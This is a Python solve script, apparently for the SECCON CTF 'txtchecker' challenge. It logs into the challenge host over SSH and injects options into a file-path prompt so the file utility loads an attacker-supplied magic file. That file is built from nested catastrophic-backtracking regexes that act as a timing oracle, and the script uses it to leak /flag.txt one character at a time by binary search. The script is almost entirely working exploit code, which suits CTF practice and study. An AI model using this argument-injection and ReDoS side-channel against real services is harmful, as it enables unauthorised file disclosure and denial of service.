import tty

from pwn import *


def check_lower(prefix, t):
    connection = "ctf@txtchecker.seccon.games"
    # connection = "ctf@localhost"

    con = process(
        f"sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no {connection} -p 2022".split(),
        stdin=PTY,
        raw=False,
    )

    con.sendlineafter(
        b"Input a file path: ", b"-d -e ascii --magic-file /proc/self/fd/0 -s /flag.txt"
    )

    con.recvline()

    prefix_len = len(prefix)
    assert prefix_len > 0

    payload = f"""\
0 byte x
>0 string {prefix} ASCII text custom
>>{len(prefix)} byte <{t}
>>>0 use regex500
0 name regex
>0 regex ((.?|...?){{25,}}){{,5}})+ yay
0 name regex5
>0 use regex
>0 use regex
>0 use regex
>0 use regex
>0 use regex
0 name regex25
>0 use regex5
>0 use regex5
>0 use regex5
>0 use regex5
>0 use regex5
0 name regex125
>0 use regex25
>0 use regex25
>0 use regex25
>0 use regex25
>0 use regex25
0 name regex500
>0 use regex125
>0 use regex125
>0 use regex125
>0 use regex125
""".encode()

    con.send(payload)
    con.send(bytes([tty.CEOF]))

    for _ in range(len(payload.split(b"\n")) - 1):
        con.recvline()

    con.recvall(timeout=1)
    # -1 = lower / 0 = equal or upper
    return con.poll() == -1


flag = "SECCON"

# SECCON{reDo5L1fe}
while len(flag) < 17:
    lo = 20
    hi = 126
    while lo < hi:
        print(flag, lo, hi)

        mid = (lo + hi) >> 1
        if check_lower(flag, mid + 1):
            hi = mid
        else:
            lo = mid + 1

    flag += chr(lo)
    print(flag)
